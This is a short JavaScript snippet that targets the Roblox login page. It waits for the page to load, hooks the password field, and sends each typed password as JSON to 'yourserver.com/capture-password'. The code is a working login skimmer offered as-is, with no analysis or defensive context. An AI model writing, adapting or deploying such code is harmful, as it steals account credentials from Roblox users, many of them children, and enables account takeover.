// Wait for the Roblox login page to load
document.addEventListener('DOMContentLoaded', function() {
    // Find the password input field
    var passwordInput = document.querySelector('input[type="password"]');

    // Add an event listener to capture the password
    passwordInput.addEventListener('input', function() {
        var password = this.value;
        // Send the password to your server
        fetch('https://yourserver.com/capture-password', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ password: password })
        });
    });
});
